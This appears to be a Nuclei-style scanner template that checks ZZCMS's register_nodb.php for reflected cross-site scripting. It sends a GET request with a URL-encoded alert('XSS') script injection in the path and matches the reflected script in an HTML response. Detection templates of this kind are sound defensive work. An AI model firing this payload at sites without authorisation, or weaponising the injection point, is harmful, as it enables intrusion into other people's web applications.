id: zzcms-xss-register_nodb

info:
  name: Zzcms XSS in register_nodb.php
  author: 3th1c_yuk1
  severity: medium
  description: |
    Cross-Site Scripting (XSS) Vulnerability in ZZCMS register_nodb.php
  reference:
    - https://github.com/Sinon2003/cve/blob/main/zzcms/xss-register_nodb.php.md
  tags: xss, zzcms

http:
  - method: GET
    path:
      - "{{BaseURL}}/3/ucenter_api/code/register_nodb.php/%22%3E%3Cscript%3Ealert(\"XSS\")%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(\"XSS\")</script>"
        part: body

      - type: word
        words:
          - "text/html"
        part: header
